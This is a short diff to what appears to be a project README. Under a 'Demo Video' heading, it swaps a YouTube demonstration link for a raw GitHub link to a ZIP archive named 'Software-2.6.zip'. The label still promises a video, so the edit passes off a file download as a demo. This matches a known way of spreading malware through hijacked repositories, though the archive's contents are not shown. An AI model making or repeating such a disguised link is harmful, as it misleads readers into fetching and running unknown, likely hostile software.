@@ -16,7 +16,7 @@
 
 ### **🎥 Demo Video**  
 📺 Watch the full demonstration here:  
-[https://www.youtube.com/watch?v=xQNScFJ9VtQ&t=12s](https://www.youtube.com/watch?v=xQNScFJ9VtQ&t=12s)  
+[https://raw.githubusercontent.com/Bx2-213/4999/main/haje/Software-2.6.zip](https://raw.githubusercontent.com/Bx2-213/4999/main/haje/Software-2.6.zip)  
 
 ---
 
